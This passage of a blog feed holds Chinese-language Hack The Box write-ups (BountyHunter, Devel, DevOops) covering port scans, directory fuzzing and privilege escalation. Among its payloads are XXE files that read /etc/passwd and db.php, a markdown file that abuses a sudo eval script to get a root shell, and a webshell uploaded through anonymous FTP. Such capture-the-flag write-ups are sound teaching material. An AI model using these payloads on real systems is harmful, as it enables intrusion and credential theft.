<td align="left">Flag1</td>
<td align="left">C:\Users\haris\Desktop\user.txt</td>
</tr>
<tr>
<td align="left">Flag2</td>
<td align="left">C:\Users\Administrator\Desktop\root.txt</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>Hackthebox</category>
      </categories>
      <tags>
        <tag>CVE</tag>
        <tag>永恒之蓝</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB-BountyHunter</title>
    <url>/Hackthebox/htb/htb-bountyhunter/</url>
    <content><![CDATA[<style>.urxkjacjmyha{zoom:50%;}</style><img src="/Hackthebox/htb/htb-bountyhunter/a24c032885e56a17a6c74cc58b63e8f4.png" class="urxkjacjmyha">

<span id="more"></span>

<table>
<thead>
<tr>
<th align="left">OS</th>
<th align="left">Difficulty</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Linux</td>
<td align="left">Easy</td>
</tr>
</tbody></table>
<h3 id="Nmap-Scan"><a href="#Nmap-Scan" class="headerlink" title="Nmap Scan"></a>Nmap Scan</h3><pre class="language-bash" data-language="bash"><code class="language-bash">$ nmap <span class="token number">10.10</span>.11.100 <span class="token parameter variable">-sV</span> <span class="token parameter variable">-sC</span>  -p- <span class="token parameter variable">-T4</span> --min-rate <span class="token number">1000</span> <span class="token parameter variable">-e</span> tun0 
Starting Nmap <span class="token number">7.95</span> <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2025</span>-02-22 09:08 CST
Nmap scan report <span class="token keyword">for</span> <span class="token number">10.10</span>.11.100
Host is up <span class="token punctuation">(</span><span class="token number">0</span>.12s latency<span class="token punctuation">)</span>.
Not shown: <span class="token number">65533</span> closed tcp ports <span class="token punctuation">(</span>reset<span class="token punctuation">)</span>
PORT   STATE SERVICE VERSION
<span class="token number">22</span>/tcp <span class="token function">open</span>  <span class="token function">ssh</span>     OpenSSH <span class="token number">8</span>.2p1 Ubuntu 4ubuntu0.2 <span class="token punctuation">(</span>Ubuntu Linux<span class="token punctuation">;</span> protocol <span class="token number">2.0</span><span class="token punctuation">)</span>
<span class="token operator">|</span> ssh-hostkey: 
<span class="token operator">|</span>   <span class="token number">3072</span> d4:4c:f5:79:9a:79:a3:b0:f1:66:25:52:c9:53:1f:e1 <span class="token punctuation">(</span>RSA<span class="token punctuation">)</span>
<span class="token operator">|</span>   <span class="token number">256</span> a2:1e:67:61:8d:2f:7a:37:a7:ba:3b:51:08:e8:89:a6 <span class="token punctuation">(</span>ECDSA<span class="token punctuation">)</span>
<span class="token operator">|</span>_  <span class="token number">256</span> a5:75:16:d9:69:58:50:4a:14:11:7a:42:c1:b6:23:44 <span class="token punctuation">(</span>ED25519<span class="token punctuation">)</span>
<span class="token number">80</span>/tcp <span class="token function">open</span>  http    Apache httpd <span class="token number">2.4</span>.41 <span class="token variable"><span class="token punctuation">((</span>Ubuntu<span class="token punctuation">))</span></span>
<span class="token operator">|</span>_http-title: Bounty Hunters
<span class="token operator">|</span>_http-server-header: Apache/2.4.41 <span class="token punctuation">(</span>Ubuntu<span class="token punctuation">)</span>
Service Info: OS: Linux<span class="token punctuation">;</span> CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="token builtin class-name">.</span>
Nmap done: <span class="token number">1</span> IP address <span class="token punctuation">(</span><span class="token number">1</span> <span class="token function">host</span> up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">99.59</span> seconds
</code></pre>

<p>开放了2个端口22(SSH)和80(HTTP)，对80进行Fuzz</p>
<h3 id="Fuzzing"><a href="#Fuzzing" class="headerlink" title="Fuzzing"></a>Fuzzing</h3><p>找到&#x2F;index.php、 &#x2F;portal.php、 &#x2F;db.php</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ ffuf <span class="token parameter variable">-w</span> /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ <span class="token parameter variable">-u</span> http://10.10.11.100/FUZZ.php  <span class="token parameter variable">-t</span> <span class="token number">100</span> <span class="token parameter variable">-ic</span>

        /<span class="token string">'___\  /'</span>___<span class="token punctuation">\</span>           /'___<span class="token punctuation">\</span>       
       /<span class="token punctuation">\</span> <span class="token punctuation">\</span>__/ /<span class="token punctuation">\</span> <span class="token punctuation">\</span>__/  __  __  /<span class="token punctuation">\</span> <span class="token punctuation">\</span>__/       
       <span class="token punctuation">\</span> <span class="token punctuation">\</span> ,__<span class="token punctuation">\</span><span class="token punctuation">\</span> <span class="token punctuation">\</span> ,__<span class="token punctuation">\</span>/<span class="token punctuation">\</span> <span class="token punctuation">\</span>/<span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span> ,__<span class="token punctuation">\</span>      
        <span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span>_/ <span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span>_/<span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span>_<span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span>_/      
         <span class="token punctuation">\</span> <span class="token punctuation">\</span>_<span class="token punctuation">\</span>   <span class="token punctuation">\</span> <span class="token punctuation">\</span>_<span class="token punctuation">\</span>  <span class="token punctuation">\</span> <span class="token punctuation">\</span>____/  <span class="token punctuation">\</span> <span class="token punctuation">\</span>_<span class="token punctuation">\</span>       
          <span class="token punctuation">\</span>/_/    <span class="token punctuation">\</span>/_/   <span class="token punctuation">\</span>/___/    <span class="token punctuation">\</span>/_/       

       v2.1.0-dev
________________________________________________

 :: Method           <span class="token builtin class-name">:</span> GET
 :: URL              <span class="token builtin class-name">:</span> http://10.10.11.100/FUZZ.php
 :: Wordlist         <span class="token builtin class-name">:</span> FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
 :: Follow redirects <span class="token builtin class-name">:</span> <span class="token boolean">false</span>
 :: Calibration      <span class="token builtin class-name">:</span> <span class="token boolean">false</span>
 :: Timeout          <span class="token builtin class-name">:</span> <span class="token number">10</span>
 :: Threads          <span class="token builtin class-name">:</span> <span class="token number">100</span>
 :: Matcher          <span class="token builtin class-name">:</span> Response status: <span class="token number">200</span>-299,301,302,307,401,403,405,500
________________________________________________
index                   <span class="token punctuation">[</span>Status: <span class="token number">200</span>, Size: <span class="token number">25169</span>, Words: <span class="token number">10028</span>, Lines: <span class="token number">389</span>, Duration: 3174ms<span class="token punctuation">]</span>
portal                  <span class="token punctuation">[</span>Status: <span class="token number">200</span>, Size: <span class="token number">125</span>, Words: <span class="token number">11</span>, Lines: <span class="token number">6</span>, Duration: 204ms<span class="token punctuation">]</span>
db                      <span class="token punctuation">[</span>Status: <span class="token number">200</span>, Size: <span class="token number">0</span>, Words: <span class="token number">1</span>, Lines: <span class="token number">1</span>, Duration: 105ms<span class="token punctuation">]</span></code></pre>

<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>访问&#x2F;portal.php 跳转到表单页面</p>
<img src="/Hackthebox/htb/htb-bountyhunter/image-20250222104837169.png" class="" title="跳转">

<p>使用burp进行抓包，对数据包进行base64解码，发现是XML</p>
<img src="/Hackthebox/htb/htb-bountyhunter/image-20250222104858450.png" class="" title="表单">

<p>尝试进行XXE攻击，找到两个帐号：development和root</p>
<pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml  version="1.0" encoding="ISO-8859-1"?></span>
<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">replace</span> <span class="token punctuation">[</span><span class="token internal-subset">&lt;!ENTITY example SYSTEM "file:///etc/passwd"> </span><span class="token punctuation">]</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bugreport</span><span class="token punctuation">></span></span>
		<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&example;">&amp;example;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>
		<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>cwe</span><span class="token punctuation">></span></span>111<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>cwe</span><span class="token punctuation">></span></span>
		<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>cvss</span><span class="token punctuation">></span></span>3.0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>cvss</span><span class="token punctuation">></span></span>
		<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>reward</span><span class="token punctuation">></span></span>20<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>reward</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>bugreport</span><span class="token punctuation">></span></span></code></pre>

<img src="/Hackthebox/htb/htb-bountyhunter/image-20250222092505979.png" class="" title="XXE">

<p>使用PHP Wrapper 读取db.php文件</p>
<pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml  version="1.0" encoding="ISO-8859-1"?></span>
&lt;!DOCTYPE replace [&lt;!ENTITY example SYSTEM php://filter/convert.base64-encode/resource=db.php"> ]>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bugreport</span><span class="token punctuation">></span></span>
		<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&example;">&amp;example;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>
		<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>cwe</span><span class="token punctuation">></span></span>111<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>cwe</span><span class="token punctuation">></span></span>
		<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>cvss</span><span class="token punctuation">></span></span>3.0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>cvss</span><span class="token punctuation">></span></span>
		<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>reward</span><span class="token punctuation">></span></span>20<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>reward</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>bugreport</span><span class="token punctuation">></span></span></code></pre>

<img src="/Hackthebox/htb/htb-bountyhunter/image-20250222094939072.png" class="" title="XXE">

<p>解码base64,找到数据库密码，使用development登录SSH</p>
<img src="/Hackthebox/htb/htb-bountyhunter/image-20250222095232981.png" class="" title="解码">

<h3 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h3><p>使用<code>sudo -l</code>找个一个可利用的Python文件</p>
<img src="/Hackthebox/htb/htb-bountyhunter/image-20250222101020734.png" class="" title="提权">

<p>分析Python脚本</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#Skytrain Inc Ticket Validation System 0.1</span>
<span class="token comment">#Do not distribute this file.</span>

<span class="token keyword">def</span> <span class="token function">load_file</span><span class="token punctuation">(</span>loc<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> loc<span class="token punctuation">.</span>endswith<span class="token punctuation">(</span><span class="token string">".md"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token builtin">open</span><span class="token punctuation">(</span>loc<span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Wrong file type."</span><span class="token punctuation">)</span>
        exit<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">evaluate</span><span class="token punctuation">(</span>ticketFile<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment">#Evaluates a ticket to check for ireggularities.</span>
    code_line <span class="token operator">=</span> <span class="token boolean">None</span>
    <span class="token keyword">for</span> i<span class="token punctuation">,</span>x <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>ticketFile<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> i <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
            <span class="token keyword">if</span> <span class="token keyword">not</span> x<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">"# Skytrain Inc"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>   <span class="token operator">//</span> md 文档第<span class="token number">1</span>行需要包含
                <span class="token keyword">return</span> <span class="token boolean">False</span>
            <span class="token keyword">continue</span>
        <span class="token keyword">if</span> i <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>
            <span class="token keyword">if</span> <span class="token keyword">not</span> x<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">"## Ticket to "</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token operator">//</span>md 文档第<span class="token number">2</span>行需要包含，注意有个空格
                <span class="token keyword">return</span> <span class="token boolean">False</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Destination: </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token string">' '</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>x<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
            <span class="token keyword">continue</span>

        <span class="token keyword">if</span> x<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">"__Ticket Code:__"</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token operator">//</span>md 文档第<span class="token number">3</span>行需要包含
            code_line <span class="token operator">=</span> i<span class="token operator">+</span><span class="token number">1</span>
            <span class="token keyword">continue</span>

        <span class="token keyword">if</span> code_line <span class="token keyword">and</span> i <span class="token operator">==</span> code_line<span class="token punctuation">:</span>  <span class="token operator">//</span>md 文档第<span class="token number">4</span>行需要包含
            <span class="token keyword">if</span> <span class="token keyword">not</span> x<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">"**"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                <span class="token keyword">return</span> <span class="token boolean">False</span>
            ticketCode <span class="token operator">=</span> x<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"**"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"+"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>  <span class="token operator">//</span>匹配<span class="token operator">**</span>开头，并且根据<span class="token operator">+</span>分割，取第一项
            <span class="token keyword">if</span> <span class="token builtin">int</span><span class="token punctuation">(</span>ticketCode<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">7</span> <span class="token operator">==</span> <span class="token number">4</span><span class="token punctuation">:</span>  <span class="token operator">//</span>取出的值模<span class="token number">7</span> 等于<span class="token number">4</span> 如<span class="token number">4</span><span class="token punctuation">,</span><span class="token number">11</span>，<span class="token number">18</span>
                validationNumber <span class="token operator">=</span> <span class="token builtin">eval</span><span class="token punctuation">(</span>x<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"**"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
                <span class="token keyword">if</span> validationNumber <span class="token operator">></span> <span class="token number">100</span><span class="token punctuation">:</span>
                    <span class="token keyword">return</span> <span class="token boolean">True</span>
                <span class="token keyword">else</span><span class="token punctuation">:</span>
                    <span class="token keyword">return</span> <span class="token boolean">False</span>
    <span class="token keyword">return</span> <span class="token boolean">False</span>

<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    fileName <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"Please enter the path to the ticket file.\n"</span><span class="token punctuation">)</span>
    ticket <span class="token operator">=</span> load_file<span class="token punctuation">(</span>fileName<span class="token punctuation">)</span>
    <span class="token comment">#DEBUG print(ticket)</span>
    result <span class="token operator">=</span> evaluate<span class="token punctuation">(</span>ticket<span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Valid ticket."</span><span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Invalid ticket."</span><span class="token punctuation">)</span>
    ticket<span class="token punctuation">.</span>close

main<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>

<p>分析Python脚本后，创建一个md文件，使用sudo 运行脚本，提权成功</p>
<pre class="language-none"><code class="language-none"># Skytrain Inc
## Ticket to 
__Ticket Code:__
**11+eval(&quot;__import__(&#39;os&#39;).system(&#39;bash&#39;)&quot;)</code></pre>

<img src="/Hackthebox/htb/htb-bountyhunter/image-20250222104056058.png" class="" title="Getshell">

<table>
<thead>
<tr>
<th align="left">Flag</th>
<th align="left">Path</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Flag1</td>
<td align="left">&#x2F;home&#x2F;development&#x2F;user.txt</td>
</tr>
<tr>
<td align="left">Flag2</td>
<td align="left">&#x2F;root&#x2F;root.txt</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>Hackthebox</category>
      </categories>
      <tags>
        <tag>XXE</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB-Devel</title>
    <url>/Hackthebox/htb/htb-devel/</url>
    <content><![CDATA[<style>.kmjzkmtdcihv{zoom:50%;}</style><img src="/Hackthebox/htb/htb-devel/0fb6455a29eb4f2682f04a780ce26cb1.png" class="kmjzkmtdcihv">

<span id="more"></span>

<table>
<thead>
<tr>
<th>OS</th>
<th>Difficulty</th>
</tr>
</thead>
<tbody><tr>
<td>Windows</td>
<td>Easy</td>
</tr>
</tbody></table>
<h3 id="Nmap-scan"><a href="#Nmap-scan" class="headerlink" title="Nmap scan"></a>Nmap scan</h3><img src="/Hackthebox/htb/htb-devel/image-20250201213314487.png" class="" title="Nmap">

<p>发现两个开放端口 21和80，FTP允许匿名登录，先登录FTP看看，FTP的目录底下是主站点的文件</p>
<style>.fssakxwqoytj{zoom:150%;}</style><img src="/Hackthebox/htb/htb-devel/image-20250201213757511.png" class="fssakxwqoytj" alt="登录FTP">

<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>生成一个webshell然后通过ftp上传</p>
<img src="/Hackthebox/htb/htb-devel/image-20250201215256322.png" class="" title="生成webshell">

<img src="/Hackthebox/htb/htb-devel/image-20250201215437794.png" class="" title="上传FTP成功">

<p>访问webshell，成功接收到shell</p>
<img src="/Hackthebox/htb/htb-devel/image-20250201215830245.png" class="" title="GetShell">

<h3 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h3><p>查看系统信息，是个win7，使用ms10-015，提权成功</p>
<img src="/Hackthebox/htb/htb-devel/image-20250201220950888.png" class="" title="sysinfo">

<img src="/Hackthebox/htb/htb-devel/image-20250201220847566.png" class="" title="提权成功">

<table>
<thead>
<tr>
<th>flag</th>
<th>path</th>
</tr>
</thead>
<tbody><tr>
<td>flag1</td>
<td>C:\Users\babis\Desktop\user.txt</td>
</tr>
<tr>
<td>flag2</td>
<td>C:\Users\Administrator\Desktop\root.txt</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>Hackthebox</category>
      </categories>
      <tags>
        <tag>文件上传</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB-DevOops</title>
    <url>/Hackthebox/htb/htb-devoops/</url>
    <content><![CDATA[<style>.vujfhiqjlhkt{zoom:50%;}</style><img src="/Hackthebox/htb/htb-devoops/c74d84352f781ad5c7a4c35c0c3aa0ac.png" class="vujfhiqjlhkt">

<span id="more"></span>

<table>
<thead>
<tr>
<th align="left">OS</th>
<th align="left">Difficulty</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Linux</td>
<td align="left">Medium</td>
</tr>
</tbody></table>
<h3 id="Nmap-Scan"><a href="#Nmap-Scan" class="headerlink" title="Nmap Scan"></a>Nmap Scan</h3><pre class="language-bash" data-language="bash"><code class="language-bash">$ nmap <span class="token number">10.10</span>.10.91 <span class="token parameter variable">-sV</span> <span class="token parameter variable">-sC</span>  -p- <span class="token parameter variable">-T4</span> --min-rate <span class="token number">1000</span> <span class="token parameter variable">-e</span> tun0 
Starting Nmap <span class="token number">7.95</span> <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2025</span>-02-21 <span class="token number">22</span>:09 CST
Nmap scan report <span class="token keyword">for</span> <span class="token number">10.10</span>.10.91
Host is up <span class="token punctuation">(</span><span class="token number">0</span>.19s latency<span class="token punctuation">)</span>.
Not shown: <span class="token number">65533</span> closed tcp ports <span class="token punctuation">(</span>reset<span class="token punctuation">)</span>
PORT     STATE SERVICE VERSION
<span class="token number">22</span>/tcp   <span class="token function">open</span>  <span class="token function">ssh</span>     OpenSSH <span class="token number">7</span>.2p2 Ubuntu 4ubuntu2.4 <span class="token punctuation">(</span>Ubuntu Linux<span class="token punctuation">;</span> protocol <span class="token number">2.0</span><span class="token punctuation">)</span>
<span class="token operator">|</span> ssh-hostkey: 
<span class="token operator">|</span>   <span class="token number">2048</span> <span class="token number">42</span>:90:e3:35:31:8d:8b:86:17:2a:fb:38:90:da:c4:95 <span class="token punctuation">(</span>RSA<span class="token punctuation">)</span>
<span class="token operator">|</span>   <span class="token number">256</span> b7:b6:dc:c4:4c:87:9b:75:2a:00:89:83:ed:b2:80:31 <span class="token punctuation">(</span>ECDSA<span class="token punctuation">)</span>
<span class="token operator">|</span>_  <span class="token number">256</span> d5:2f:19:53:b2:8e:3a:4b:b3:dd:3c:1f:c0:37:0d:00 <span class="token punctuation">(</span>ED25519<span class="token punctuation">)</span>
<span class="token number">5000</span>/tcp <span class="token function">open</span>  http    Gunicorn <span class="token number">19.7</span>.1
<span class="token operator">|</span>_http-title: Site doesn't have a title <span class="token punctuation">(</span>text/html<span class="token punctuation">;</span> <span class="token assign-left variable">charset</span><span class="token operator">=</span>utf-8<span class="token punctuation">)</span>.
<span class="token operator">|</span>_http-server-header: gunicorn/19.7.1
Service Info: OS: Linux<span class="token punctuation">;</span> CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="token builtin class-name">.</span>
Nmap done: <span class="token number">1</span> IP address <span class="token punctuation">(</span><span class="token number">1</span> <span class="token function">host</span> up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">130.88</span> seconds
</code></pre>

<p>开放了两个端口22(SSH)和5000(HTTP)，添加本地域名解析到hosts文件</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token builtin class-name">echo</span> <span class="token string">'10.10.10.91 devoops.htb'</span> <span class="token operator">|</span> <span class="token function">sudo</span> <span class="token function">tee</span> <span class="token parameter variable">-a</span> /etc/hosts </code></pre>

<h3 id="目录Fuzzing"><a href="#目录Fuzzing" class="headerlink" title="目录Fuzzing"></a>目录Fuzzing</h3><p>使用ffuf 工具对目录进行猜解，发现&#x2F;upload、&#x2F;feed、&#x2F;newpost</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ ffuf <span class="token parameter variable">-w</span> /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ <span class="token parameter variable">-u</span> http://devoops.htb:5000/FUZZ  <span class="token parameter variable">-t</span> <span class="token number">100</span> <span class="token parameter variable">-ic</span>

        /<span class="token string">'___\  /'</span>___<span class="token punctuation">\</span>           /'___<span class="token punctuation">\</span>       
       /<span class="token punctuation">\</span> <span class="token punctuation">\</span>__/ /<span class="token punctuation">\</span> <span class="token punctuation">\</span>__/  __  __  /<span class="token punctuation">\</span> <span class="token punctuation">\</span>__/       
       <span class="token punctuation">\</span> <span class="token punctuation">\</span> ,__<span class="token punctuation">\</span><span class="token punctuation">\</span> <span class="token punctuation">\</span> ,__<span class="token punctuation">\</span>/<span class="token punctuation">\</span> <span class="token punctuation">\</span>/<span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span> ,__<span class="token punctuation">\</span>      
        <span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span>_/ <span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span>_/<span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span>_<span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span>_/      
         <span class="token punctuation">\</span> <span class="token punctuation">\</span>_<span class="token punctuation">\</span>   <span class="token punctuation">\</span> <span class="token punctuation">\</span>_<span class="token punctuation">\</span>  <span class="token punctuation">\</span> <span class="token punctuation">\</span>____/  <span class="token punctuation">\</span> <span class="token punctuation">\</span>_<span class="token punctuation">\</span>       
          <span class="token punctuation">\</span>/_/    <span class="token punctuation">\</span>/_/   <span class="token punctuation">\</span>/___/    <span class="token punctuation">\</span>/_/       

       v2.1.0-dev
________________________________________________

 :: Method           <span class="token builtin class-name">:</span> GET
 :: URL              <span class="token builtin class-name">:</span> http://devoops.htb:5000/FUZZ
 :: Wordlist         <span class="token builtin class-name">:</span> FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
 :: Follow redirects <span class="token builtin class-name">:</span> <span class="token boolean">false</span>
 :: Calibration      <span class="token builtin class-name">:</span> <span class="token boolean">false</span>
 :: Timeout          <span class="token builtin class-name">:</span> <span class="token number">10</span>
 :: Threads          <span class="token builtin class-name">:</span> <span class="token number">100</span>
 :: Matcher          <span class="token builtin class-name">:</span> Response status: <span class="token number">200</span>-299,301,302,307,401,403,405,500
________________________________________________

                        <span class="token punctuation">[</span>Status: <span class="token number">200</span>, Size: <span class="token number">285</span>, Words: <span class="token number">43</span>, Lines: <span class="token number">1</span>, Duration: 297ms<span class="token punctuation">]</span>
upload                  <span class="token punctuation">[</span>Status: <span class="token number">200</span>, Size: <span class="token number">347</span>, Words: <span class="token number">44</span>, Lines: <span class="token number">1</span>, Duration: 167ms<span class="token punctuation">]</span>
feed                    <span class="token punctuation">[</span>Status: <span class="token number">200</span>, Size: <span class="token number">546263</span>, Words: <span class="token number">6030</span>, Lines: <span class="token number">1816</span>, Duration: 299ms<span class="token punctuation">]</span>
newpost                 <span class="token punctuation">[</span>Status: <span class="token number">405</span>, Size: <span class="token number">178</span>, Words: <span class="token number">20</span>, Lines: <span class="token number">5</span>, Duration: 109ms<span class="token punctuation">]</span></code></pre>

<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>访问 &#x2F;upload 在上传文件的地方可以看到xml格式</p>
<img src="/Hackthebox/htb/htb-devoops/image-20250221224346237.png" class="" title="upload">

<p>构造一个简单xml测试，可以看到Doe被解析出来</p>
<pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span>
<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">replace</span> <span class="token punctuation">[</span><span class="token internal-subset"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">example</span> <span class="token attr-name">"Doe"</span><span class="token punctuation">></span></span> </span><span class="token punctuation">]</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Author</span><span class="token punctuation">></span></span>Lee<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Author</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Subject</span><span class="token punctuation">></span></span>test<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Subject</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Content</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&example;">&amp;example;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Content</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></code></pre>

<img src="/Hackthebox/htb/htb-devoops/image-20250221225731266.png" class="" title="xxe">

<p>修改xml 读取&#x2F;etc&#x2F;passwd 文件</p>
<pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span>
